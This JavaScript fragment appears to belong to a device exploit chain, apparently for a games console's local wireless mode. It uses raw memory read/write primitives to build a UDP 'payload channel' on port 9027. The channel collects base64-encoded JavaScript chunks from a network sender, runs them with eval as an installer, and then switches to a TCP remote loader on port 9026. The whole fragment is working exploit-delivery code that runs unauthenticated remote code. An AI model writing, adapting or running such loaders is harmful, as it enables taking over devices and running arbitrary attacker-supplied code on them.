        // ==== UDP payload channel (LDN, fully offline) ====
        // Safe bulk read: one read64 per 8 bytes (read8 does a full read64 anyway).
        function fast_str(addr, len) {
            const codes = new Array(len);
            let i = 0;
            for (; i + 8 <= len; i += 8) {
                const v = read64(addr + BigInt(i));
                codes[i]     = Number(v & 0xffn);
                codes[i + 1] = Number((v >> 8n) & 0xffn);
                codes[i + 2] = Number((v >> 16n) & 0xffn);
                codes[i + 3] = Number((v >> 24n) & 0xffn);
                codes[i + 4] = Number((v >> 32n) & 0xffn);
                codes[i + 5] = Number((v >> 40n) & 0xffn);
                codes[i + 6] = Number((v >> 48n) & 0xffn);
                codes[i + 7] = Number((v >> 56n) & 0xffn);
            }
            for (; i < len; i++) codes[i] = Number(read8(addr + BigInt(i)));
            let s = "";
            for (let k = 0; k < len; k += 4096)
                s += String.fromCharCode.apply(null, codes.slice(k, k + 4096));
            return s;
        }

        function b64d(s) {
            const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            const m = {};
            for (let i = 0; i < 64; i++) m[A[i]] = i;
            const o = [];
            let i = 0;
            while (i + 3 < s.length) {
                const c0 = m[s[i]], c1 = m[s[i+1]];
                const p2 = s[i+2] === "=", p3 = s[i+3] === "=";
                const c2 = p2 ? 0 : m[s[i+2]], c3 = p3 ? 0 : m[s[i+3]];
                const v = (c0 << 18) | (c1 << 12) | (c2 << 6) | c3;
                o.push((v >> 16) & 255);
                if (!p2) o.push((v >> 8) & 255);
                if (!p2 && !p3) o.push(v & 255);
                i += 4;
            }
            let r = "";
            for (let k = 0; k < o.length; k++) r += String.fromCharCode(o[k]);
            return r;
        }

        async function core_udp_loader() {
            const UD = 9027;
            const fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd === -1n) { await log("udp socket failed"); return; }
            const rcvbuf = malloc(4);
            write32(rcvbuf, 512 * 1024);
            setsockopt(fd, SOL_SOCKET, 0x1002, rcvbuf, 4);   /* SO_RCVBUF */
            for (let i = 0; i < 16; i++) write8(sockaddr_in + BigInt(i), 0);
            write8(sockaddr_in, 16n);
            write8(sockaddr_in + 1n, 2n);
            write16(sockaddr_in + 2n, BigInt(((UD & 0xff) << 8) | (UD >> 8)));
            write32(sockaddr_in + 4n, 0n);
            if (bind(fd, sockaddr_in, 16) === -1n) { await log("udp bind failed"); return; }
            await log("UDP PAYLOAD CHANNEL :9027");

            const buf = malloc(2048);
            const tx = malloc(64);
            const tpl = [], js = [];
            let needT = 0, needJ = 0, rx = 0, gotT = 0, gotJ = 0;
            let connected = false, finished = false;

            function udp_tx(text) {
                const len = text.length;
                for (let i = 0; i < len; i++) write8(tx + BigInt(i), BigInt(text.charCodeAt(i)));
                send(fd, tx, len, 0);
            }

            async function finish_install() {
                if (finished) return;
                finished = true;
                for (let k = 0; k < 3; k++) udp_tx("D");
                window.__tpl = tpl.slice(0, needT);
                const src = b64d(js.slice(0, needJ).join(""));
                await log("RUNNING INSTALLER (" + src.length + " bytes)");
                try { await eval(src); } catch (e) { await log("E: " + e.message); await log(e.stack); }
                await log("INSTALLER RETURNED");
                await log("leaving ldn network.");
                await log("switching to TCP loader :9026");
                await remote_js_loader();
            }

            async function try_finish() {
                if (!finished && needT && needJ && gotT >= needT && gotJ >= needJ)
                    await finish_install();
            }

            function request_missing() {
                let n = 0;
                for (let i = 0; i < needT && n < 96; i++)
                    if (!tpl[i]) { udp_tx("t" + i); n++; }
                for (let i = 0; i < needJ && n < 96; i++)
                    if (!js[i]) { udp_tx("j" + i); n++; }
                return n;
            }

            for (;;) {
                const n = Number(recv(fd, buf, 2048, 0));
                if (n <= 0) continue;
                rx++;
                if (finished) continue;
                let s;
                try { s = fast_str(buf, n); } catch (e) { s = ""; }
                if (!s) continue;
                try {
                    const c = s[0], p = s.indexOf(':');
                    if (c === 'T' || c === 'J') {
                        const arr = (c === 'T') ? tpl : js;
                        const i = +s.slice(1, p);
                        if (!arr[i]) {
                            arr[i] = s.slice(p + 1);
                            if (c === 'T') gotT++; else gotJ++;
                        }
                        await try_finish();
                    } else if (c === 'A') {
                        const p2 = s.indexOf(':', p + 1);
                        needT = +s.slice(1, p);
                        needJ = p2 > 0 ? +s.slice(p + 1, p2) : +s.slice(p + 1);
                        if (p2 > 0 && !connected) {
                            const ip = s.slice(p2 + 1).split('.');
                            if (ip.length === 4) {
                                for (let i = 0; i < 16; i++) write8(sockaddr_in + BigInt(i), 0);
                                write8(sockaddr_in, 16n);
                                write8(sockaddr_in + 1n, 2n);
                                write16(sockaddr_in + 2n, BigInt(((UD & 0xff) << 8) | (UD >> 8)));
                                write32(sockaddr_in + 4n,
                                    BigInt(+ip[0]) | (BigInt(+ip[1]) << 8n) |
                                    (BigInt(+ip[2]) << 16n) | (BigInt(+ip[3]) << 24n));
                                connected = connect(fd, sockaddr_in, 16) === 0n;
                            }
                        }
                        await log("UDP header tpl=" + needT + " js=" + needJ +
                                  (connected ? " (nak)" : ""));
                    } else if (c === 'G') {
                        if (!connected) {
                            await log("UDP no return path; cannot request missing chunks");
                            continue;
                        }
                        const miss = request_missing();
                        if (miss) {
                            await log("UDP repairing " + miss + " chunk(s) rx=" + rx);
                        } else {
                            await try_finish();
                        }
                    }
                } catch (e) { await log("udp rx: " + e.message); }
            }
        }
        core_udp_loader();
